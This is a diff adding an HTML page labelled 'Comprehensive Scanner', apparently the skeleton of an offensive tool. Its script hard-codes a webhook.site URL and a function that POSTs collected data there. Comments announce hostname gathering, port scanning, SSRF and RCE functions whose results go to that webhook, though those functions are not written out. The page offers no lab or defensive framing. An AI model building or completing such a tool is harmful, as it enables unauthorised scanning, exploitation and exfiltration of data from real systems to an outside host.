@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Comprehensive Scan</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/github-markdown-css/4.0.0/github-markdown.min.css">
+    <style>
+        body { background-color: #f6f8fa; color: #24292e; font-family: Arial, sans-serif; }
+        .status-summary { margin: 20px 0; padding: 10px; border: 1px solid #e1e4e8; border-radius: 5px; }
+        .log { white-space: pre-wrap; background-color: #fff; padding: 10px; border: 1px solid #e1e4e8; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <h1>Comprehensive Scanner</h1>
+    <div class="status-summary">
+        <h2>Status Summary</h2>
+        <p>Running status checks...</p>
+    </div>
+    <div class="log">
+        <h2>Real-time Logging</h2>
+        <pre id="logOutput"></pre>
+    </div>
+    <script>
+        // Webhook integration
+        const webhookUrl = 'https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94';
+        function sendStatusUpdate(data) {
+            fetch(webhookUrl, {
+                method: 'POST',
+                body: JSON.stringify(data),
+                headers: { 'Content-Type': 'application/json' }
+            });
+        }
+        // Functions for scanning: hostname gathering, port scanning, SSRF, RCE...
+        // Update logOutput and send updates to webhook as needed
+    </script>
+</body>
+</html>
